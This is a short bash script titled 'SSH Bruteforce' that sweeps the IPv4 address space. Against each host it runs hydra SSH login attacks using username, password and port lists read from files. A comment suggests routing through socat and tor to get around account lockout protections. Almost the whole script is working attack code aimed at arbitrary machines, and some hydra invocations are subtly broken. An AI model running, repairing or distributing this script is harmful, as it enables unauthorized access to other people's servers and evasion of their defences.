#!/bin/bash
#
# list of usernames in username.lst
# list of passwords in wordlist.lst
# list of ports to scan in portnumber.txt 
# for sem parallel check www.gnu.org/s/parallel 
# to prevent account lockouts you can use 
# socat+tor with refresh intervals to replicate.  
#
# ./zep.sh x x x x

OLDIFS=$IFS
IFS=$'\n';
set -f
echo " SSH Bruteforce "
for ((x = $1; x < 255; x++)); do
	for ((y = $2; y < 255; y++)); do
		for ((z = $3; z < 255; z++)); do
			for ((f = $4; f < 255; f++)); do
				for a in $(cat username.lst); do
					for e in $(cat wordlist.lst); do
						for p in $(cat portnumber.txt); do
							class=$x.$y.$z.$f
							parallel=40
							hydra=`hydra -l "$a" -P "$e" -t 7 -w 5 -s "$p" -f "$class" ssh & ` #hydra=`sem -j "$parallel" hydra -l "$a" -P "$e" -t 7 -w 5 -s "$p" -f "$class" ssh` echo " [~] ~ Attacking $x.$y.$z.$f  with username: $a password: $e"
							$hydra
						done;
					wait
					done;
				done;
			done;
		done;
	done;
done

IFS=$OLDIFS
set +f
